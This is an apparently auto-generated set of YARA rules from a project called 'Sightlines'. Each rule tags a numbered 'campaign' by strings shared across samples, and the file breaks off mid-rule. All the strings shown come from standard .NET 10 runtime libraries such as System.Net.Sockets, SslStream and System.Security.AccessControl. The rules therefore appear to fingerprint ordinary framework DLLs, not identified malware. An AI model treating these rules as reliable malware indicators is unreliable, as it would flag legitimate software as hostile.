        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-3657c2c7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.Collections.Specialized/Release/net10.0/System.Collections.Speci" ascii
        $s4 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s5 = "POnDeserialization method was called while the object was not being deserialized.r" ascii
        $s6 = ".NETCoreApp,Version=v10.0" ascii
        $s7 = "InlineArrayAsReadOnlySpan" ascii
        $s8 = " $(,048<@DHLPTX\\`dhl" ascii
        $s9 = "s\" featurevalue=\"false\">" ascii
        $s10 = "<>y__InlineArray2`1" ascii
        $s11 = "IsAotCompatible" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_6b6a2854_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-6b6a2854"
        date = "2026-10-31"
        campaign = "tlsh-6b6a2854"
        family = ""
        hash = "1be17f4c6bd354f1a5654d9dd30b52a11965d4ac42208d173c73cf9aecb3d8c5"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-6b6a2854.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/_/src/runtime/artifacts/obj/System.Data/Release/net10.0-windows/System.Data.pdb" ascii
        $s1 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s2 = ".NETCoreApp,Version=v10.0" ascii
        $s3 = "IsAotCompatible" ascii
        $s4 = ".NET 10.0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 5 of them
}

rule Sightlines_tlsh_fe483b9d_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-fe483b9d"
        date = "2026-10-31"
        campaign = "tlsh-fe483b9d"
        family = ""
        hash = "1d6691eee72ab1bd3924d8bc2ece16ff4f7aa1c2cc946d9b01344b55bff9538a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-fe483b9d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "<GetSecurityInfoByName>g____PInvoke|19_0" ascii
        $s4 = "<SetSecurityInfoByHandle>g____PInvoke|18_0" ascii
        $s5 = "<SetSecurityInfoByName>g____PInvoke|20_0" ascii
        $s6 = "<AdjustTokenPrivileges>g____PInvoke|25_0" ascii
        $s7 = "/_/src/runtime/artifacts/obj/System.Security.AccessControl/Release/net10.0-windows/System.Security.A" ascii
        $s8 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s9 = "0Only single dimension arrays are supported here.o" ascii
        $s10 = "<DuplicateTokenEx>g____PInvoke|26_0" ascii
        $s11 = "<OpenProcessToken>g____PInvoke|23_0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_096d1a04_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-096d1a04"
        date = "2026-10-31"
        campaign = "tlsh-096d1a04"
        family = ""
        hash = "1e321f049426f4e1a2d27c742d2a7b335f1dd041793b87011a6e0161c0728d88"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-096d1a04.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.Net.WebSockets.Client/Release/net10.0/System.Net.WebSockets.Clie" ascii
        $s4 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s5 = "&Unable to connect to the remote serverl" ascii
        $s6 = "DefaultClientKeepAliveInterval" ascii
        $s7 = ".NETCoreApp,Version=v10.0" ascii
        $s8 = "InlineArrayAsReadOnlySpan" ascii
        $s9 = "DefaultKeepAliveTimeout" ascii
        $s10 = " featurevalue=\"false\">" ascii
        $s11 = "<>y__InlineArray2`1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_111568a2_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-111568a2"
        date = "2026-10-31"
        campaign = "tlsh-111568a2"
        family = ""
        hash = "1f097ff565059147be68fdac148db435eaf9c2dd0a6f8248369e818f2cada590"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-111568a2.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "System.Diagnostics.Tracing.EventKeywords, System.Diagnostics.Tracing, Version=10.0.0.0, Culture=neut" ascii
        $s4 = "ISystem.Net.Sockets.SocketAsyncEventArgs+<<DnsConnectAsync>g__Core|113_0>d" ascii
        $s5 = "8System.Net.Sockets.Socket+<<ConnectAsync>g__Core|293_0>d" ascii
        $s6 = "=System.Net.Sockets.Socket+<AcceptAndReceiveHelperAsync>d__207" ascii
        $s7 = "Only use with Socket.Blocking=false on WASI" wide
        $s8 = "/_/src/runtime/artifacts/obj/System.Net.Sockets/Release/net10.0-windows/System.Net.Sockets.pdb" ascii
        $s9 = "5464748494:4<;=;>;?;@;A;JIKIMLPOQO[Z\\Zdc" wide
        $s10 = "<CompleteCore>g__CleanupIOCPResult|169_0" ascii
        $s11 = "<DoOperationReceiveMessageFrom>g__Core|150_0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1061392 and 12 of them
}

rule Sightlines_tlsh_6ccf10c8_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-6ccf10c8"
        date = "2026-10-31"
        campaign = "tlsh-6ccf10c8"
        family = ""
        hash = "21e9db02782d569548e1ef988b50220ed5912de210681a34130bedda72399e5d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-6ccf10c8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "MSystem.Reflection.TypeExtensions is not supported on NET Standard 1.3 or 1.5.x" ascii
        $s4 = "/_/src/runtime/artifacts/obj/System.Reflection.TypeExtensions/Release/net10.0/System.Reflection.Type" ascii
        $s5 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s6 = ".NETCoreApp,Version=v10.0" ascii
        $s7 = "eys\" featurevalue=\"false\">" ascii
        $s8 = "IsAotCompatible" ascii
        $s9 = "Extensions.pdb" ascii
        $s10 = ".NET 10.0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 11 of them
}

rule Sightlines_tlsh_4b0663dc_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-4b0663dc"
        date = "2026-10-31"
        campaign = "tlsh-4b0663dc"
        family = ""
        hash = "025905a371a3dc17ce26518a281315fd0428f4c579600f8ebfc7df106bca54d8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-4b0663dc.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "<RegexGenerator_g>F3846317665D1ABF3801AE2FE0960EF8ACBF58466C53082BD1467D37A02DDB4B6__FullSRSInternal" ascii
        $s1 = "<RegexGenerator_g>F3846317665D1ABF3801AE2FE0960EF8ACBF58466C53082BD1467D37A02DDB4B6__Utilities" ascii
        $s2 = "<TypeOfXmlSchemaProviderAttribute>k__BackingField" ascii
        $s3 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s4 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s5 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s6 = "<TypeOfIDictionaryEnumerator>k__BackingField" ascii
        $s7 = "<TypeOfKnownTypeAttribute>k__BackingField" ascii
        $s8 = "<TypeOfExtensionDataObject>k__BackingField" ascii
        $s9 = "<TypeOfEnumMemberAttribute>k__BackingField" ascii
        $s10 = "<TypeOfIExtensibleDataObject>k__BackingField" ascii
        $s11 = "<TypeOfXmlFormatClassWriterDelegate>k__BackingField" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 4125296 and 12 of them
}

rule Sightlines_tlsh_1f2e35ed_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1f2e35ed"
        date = "2026-10-31"
        campaign = "tlsh-1f2e35ed"
        family = ""
        hash = "227ecb036594a171e73c3144f8767bf722bce2a89c6b09693d5931e951e79357"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1f2e35ed.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/_/src/runtime/artifacts/obj/System.Security/Release/net10.0-windows/System.Security.pdb" ascii
        $s1 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s2 = ".NETCoreApp,Version=v10.0" ascii
        $s3 = "IsAotCompatible" ascii
        $s4 = ".NET 10.0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 5 of them
}

rule Sightlines_tlsh_b5da7814_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-b5da7814"
        date = "2026-10-31"
        campaign = "tlsh-b5da7814"
        family = ""
        hash = "060bcc88a688e687ff1404b83b5fb5cf17e19ec57f33d5b8a48ab494da83c134"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-b5da7814.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "%$'&(&)&+*,*21316575?>@>HGJIKIXWZY[Y\\Y]Y^Y_Y`YaYbYcYdYeYfYgYontsus{z}|" wide
        $s1 = "<EmitTryMatchAtCurrentPosition>g__CanEmitIndexOf|324_29" ascii
        $s2 = "<SpanLastIndexOfAnyExceptCharMethod>k__BackingField" ascii
        $s3 = "<SpanLastIndexOfAnyExceptSearchValuesMethod>k__BackingField" ascii
        $s4 = "<SpanLastIndexOfAnyExceptCharCharMethod>k__BackingField" ascii
        $s5 = "<SpanLastIndexOfAnySearchValuesMethod>k__BackingField" ascii
        $s6 = "<SpanIndexOfAnyExceptSearchValuesMethod>k__BackingField" ascii
        $s7 = "<EmitTryFindNextPossibleStartingPosition>g__EmitIndexOf_RightToLeft|323_2" ascii
        $s8 = "<SpanLastIndexOfAnyExceptCharCharCharMethod>k__BackingField" ascii
        $s9 = "<EmitTryFindNextPossibleStartingPosition>g__EmitIndexOfString_LeftToRight|323_1" ascii
        $s10 = "<SpanLastIndexOfAnyCharCharMethod>k__BackingField" ascii
        $s11 = "<SpanIndexOfAnyExceptCharMethod>k__BackingField" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2077200 and 12 of them
}

rule Sightlines_tlsh_3066bee0_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-3066bee0"
        date = "2026-10-31"
        campaign = "tlsh-3066bee0"
        family = ""
        hash = "18a148b3656f45f9d537f7e25a558ba48abbfe103533717344cdf1888d903e6b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-3066bee0.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.Resources.Writer/Release/net10.0/System.Resources.Writer.pdb" ascii
        $s4 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s5 = " Stream does not support seeking.]" ascii
        $s6 = ".NETCoreApp,Version=v10.0" ascii
        $s7 = "IsAotCompatible" ascii
        $s8 = ".NET 10.0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 9 of them
}

rule Sightlines_tlsh_2d4c082e_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-2d4c082e"
        date = "2026-10-31"
        campaign = "tlsh-2d4c082e"
        family = ""
        hash = "3bb4d100413ff281ea8a70a22216d8d17d4bcb21610be258d948de4ce6b1a8e5"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-2d4c082e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.Threading/Release/net10.0/System.Threading.pdb" ascii
        $s4 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s5 = "4The write lock is being released without being held.H" ascii
        $s6 = ".NETCoreApp,Version=v10.0" ascii
        $s7 = "\"&*.26:>BFJNRVZ^bfjnrvz" ascii
        $s8 = "InlineArrayAsReadOnlySpan" ascii
        $s9 = "NamedWaitHandleOptions" ascii
        $s10 = "<>y__InlineArray2`1" ascii
        $s11 = "IsAotCompatible" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_06564bbf_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-06564bbf"
        date = "2026-10-31"
        campaign = "tlsh-06564bbf"
        family = ""
        hash = "05e237db20290fbec9e9b51fada3984bed028c659b6c6f1d20385afbe5e88e25"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-06564bbf.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.Net.WebHeaderCollection/Release/net10.0/System.Net.WebHeaderColl" ascii
        $s4 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s5 = "WThis collection holds request headers and cannot contain the specified response header.r" ascii
        $s6 = "<HeaderInfo>k__BackingField" ascii
        $s7 = ".NETCoreApp,Version=v10.0" ascii
        $s8 = "InlineArrayAsReadOnlySpan" ascii
        $s9 = "s\" featurevalue=\"false\">" ascii
        $s10 = "<>y__InlineArray2`1" ascii
        $s11 = "IsAotCompatible" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_8d512f40_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-8d512f40"
        date = "2026-10-31"
        campaign = "tlsh-8d512f40"
        family = ""
        hash = "464900194cc2d5c405dba28b1b0ab02174fe224c2ea86ddf6ed4e48cea814e72"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-8d512f40.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "OSystem.Net.Security.SslStream+<<WriteSingleChunk>g__WaitAndWriteAsync|166_0>d`1" ascii
        $s1 = "PSystem.Net.Security.SslStream+<<WriteSingleChunk>g__CompleteWriteAsync|166_1>d`1" ascii
        $s2 = "<ThrowIfExceptionalOrNotAuthenticatedOrShutdown>g__ThrowAlreadyShutdown|134_0" ascii
        $s3 = "BSystem.Net.Security.SslStream+<ReceiveHandshakeFrameAsync>d__160`1" ascii
        $s4 = "DSystem.Net.Security.SslStream+<ReplyOnReAuthenticationAsync>d__157`1" ascii
        $s5 = "9System.Net.Security.SslStream+<WriteAsyncChunked>d__165`1" ascii
        $s6 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s7 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s8 = "?System.Net.Security.SslStream+<EnsureFullTlsFrameAsync>d__170`1" ascii
        $s9 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s10 = "@System.Net.Security.SslStream+<ForceAuthenticationAsync>d__159`1" ascii
        $s11 = "System.Diagnostics.Tracing.EventKeywords, System.Diagnostics.Tracing, Version=10.0.0.0, Culture=neut" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1331728 and 12 of them
}

rule Sightlines_tlsh_41cb624a_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-41cb624a"
        date = "2026-10-31"
        campaign = "tlsh-41cb624a"
        family = ""
        hash = "47f6d55917ccaafa28480e692bf27e9dd95b5762b2c85398d575f65993bd2293"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-41cb624a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "<AppendUnknownChar>g__AppendNonAsciiBytes|47_0" ascii
        $s4 = "<NumberToBigInteger>g__DivideAndConquer|12_0" ascii
        $s5 = "<NumberToBigInteger>g__NaiveBase1E9ToBits|12_3" ascii
        $s6 = "<NumberToBigInteger>g__MultiplyAdd|12_4" ascii
        $s7 = "<BurnikelZieglerD3n2n>g__MultiplyActual|26_0" ascii
        $s8 = "<FormatBigIntegerToBinary>g__AppendByte|14_0" ascii
        $s9 = "System.Numerics.INumberBase<System.Numerics.Complex>.MultiplyAddEstimate" ascii
        $s10 = "System.Numerics.INumberBase<System.Numerics.BigInteger>.MultiplyAddEstimate" ascii
        $s11 = "<DivideBurnikelZiegler>g__Normalize|23_0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_90f9ee0b_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-90f9ee0b"
        date = "2026-10-31"
        campaign = "tlsh-90f9ee0b"
        family = ""
        hash = "4901b7f15d30d6463f08ed4221feb4c3330112240c35d7553490ba99da70c860"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-90f9ee0b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "<GetFullTypeNameLength>g__NeedsEscaping|5_1" ascii
        $s4 = "SystemEvents.EventsThreadShutdown callbacks are not run before the process exits. Use AppDomain.Proc" wide
        $s5 = "<GetFullTypeNameLength>g__GetUnescapedOffset|5_0" ascii
        $s6 = "QueryableMinByMaxByTSourceObsoleteDiagId" ascii
        $s7 = "The Queryable MinBy and MaxBy taking an IComparer<TSource> are obsolete. Use the new ones that take " wide
        $s8 = "KeyExchangeAlgorithm, KeyExchangeStrength, CipherAlgorithm, CipherStrength, HashAlgorithm and HashSt" wide
        $s9 = "<GetAssemblyNameCandidate>g__GetUnescapedOffset|8_0" ascii
        $s10 = "The constructors on Rfc2898DeriveBytes are obsolete. Use the static Pbkdf2 method instead." wide
        $s11 = "AuthenticationManager is not supported. Methods will no-op or throw PlatformNotSupportedException." wide
    condition:
        uint16(0) == 0x5A4D and filesize < 2314864 and 12 of them
}

rule Sightlines_tlsh_338aa0ef_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-338aa0ef"
        date = "2026-10-31"
        campaign = "tlsh-338aa0ef"
        family = ""
        hash = "0e0c0cbf20342fd2d3e3fdd1e2468382b2e64bfe6496277ff20002d518e5aac9"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-338aa0ef.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "System.Text.RegularExpressions.RegexOptions, System.Text.RegularExpressions, Version=10.0.0.0, Cultu" ascii
        $s1 = "/_/src/runtime/artifacts/obj/System.Net.WebProxy/Release/net10.0/System.Net.WebProxy.pdb" ascii
        $s2 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s3 = ".NETCoreApp,Version=v10.0" ascii
        $s4 = "IsAotCompatible" ascii
        $s5 = ".NET 10.0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 6 of them
}

rule Sightlines_tlsh_f7102b92_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f7102b92"
        date = "2026-10-31"
        campaign = "tlsh-f7102b92"
        family = ""
        hash = "3dc81dbc9dacd28261632c94410859eda24c2db50cd6c14309cbb2a434b50c57"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f7102b92.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/_/src/runtime/artifacts/obj/netstandard/Release/net10.0-windows/netstandard.pdb" ascii
        $s1 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s2 = ".NETCoreApp,Version=v10.0" ascii
        $s3 = "InvocationListEnumerator`1" ascii
        $s4 = "SpanSplitEnumerator`1" ascii
        $s5 = "ValueSplitEnumerator" ascii
        $s6 = "AlternateLookup`1" ascii
        $s7 = "IsAotCompatible" ascii
        $s8 = "ProcessCpuUsage" ascii
        $s9 = ".NET 10.0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 10 of them
}

rule Sightlines_tlsh_a8987623_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a8987623"
        date = "2026-10-31"
        campaign = "tlsh-a8987623"
        family = ""
        hash = "52b6d020341114450dc3cfa0d5218f8cf841d40e0f729ffc5d5d0164832b0350"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a8987623.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.ComponentModel.EventBasedAsync/Release/net10.0/System.ComponentM" ascii
        $s4 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s5 = "urceKeys\" featurevalue=\"false\">" ascii
        $s6 = ".NETCoreApp,Version=v10.0" ascii
        $s7 = "odel.EventBasedAsync.pdb" ascii
        $s8 = "IsAotCompatible" ascii
        $s9 = ".NET 10.0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 10 of them
}

rule Sightlines_tlsh_537ee3a3_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-537ee3a3"
        date = "2026-10-31"
        campaign = "tlsh-537ee3a3"
        family = ""
        hash = "34b3475af3a7b4c16a9215f15e8abb39d8474fb77f9355c029c3599e3ab0e471"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-537ee3a3.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.Memory/Release/net10.0/System.Memory.pdb" ascii
        $s4 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s5 = "6Release all references before disposing this instance.?" ascii
        $s6 = ".NETCoreApp,Version=v10.0" ascii
        $s7 = "InlineArrayAsReadOnlySpan" ascii
        $s8 = " $(,048<@DHLPTX\\`dhl" ascii
        $s9 = "SpanSplitEnumerator`1" ascii
        $s10 = "<>y__InlineArray2`1" ascii
        $s11 = "\"&*.26:>BFJNRVZ" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_acbf1669_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-acbf1669"
        date = "2026-10-31"
        campaign = "tlsh-acbf1669"
        family = ""
        hash = "532f8921e2200f2d3ea13549e71ff85e5c2d6f292f44c40ac6e1bec760928b15"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-acbf1669.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "CThe provided proxy type '{0}' must be derived from 'DispatchProxy'.u" ascii
        $s4 = "/_/src/runtime/artifacts/obj/System.Reflection.DispatchProxy/Release/net10.0/System.Reflection.Dispa" ascii
        $s5 = "DDispatchProxy does not support invocation of static virtual members." ascii
        $s6 = "get_DispatchProxy_Method_Invocation_Cannot_Be_Static" ascii
        $s7 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s8 = ".NETCoreApp,Version=v10.0" ascii
        $s9 = "InlineArrayAsReadOnlySpan" ascii
        $s10 = "ys\" featurevalue=\"false\">" ascii
        $s11 = "DispatchProxyTypes." wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_fc44f4b4_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-fc44f4b4"
        date = "2026-10-31"
        campaign = "tlsh-fc44f4b4"
        family = ""
        hash = "538b69cc037ccab32129f3983113f80bed9d4903dc2fdddc134df0c3432b46fb"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-fc44f4b4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.Threading.Channels/Release/net10.0/System.Threading.Channels.pdb" ascii
        $s4 = "TryDequeueAndReserveCompletionIfCancelable" ascii
        $s5 = "<SetCompletionAndInvokeContinuation>b__27_0" ascii
        $s6 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s7 = ",Another continuation was already registered.c" ascii
        $s8 = "<get_CancellationCallbackDelegate>b__13_0" ascii
        $s9 = "<get_CancellationCallbackDelegate>b__16_0" ascii
        $s10 = "<get_CancellationCallbackDelegate>b__18_0" ascii
        $s11 = "<CancellationCallbackDelegate>k__BackingField" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_438408ae_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-438408ae"
        date = "2026-10-31"
        campaign = "tlsh-438408ae"
        family = ""
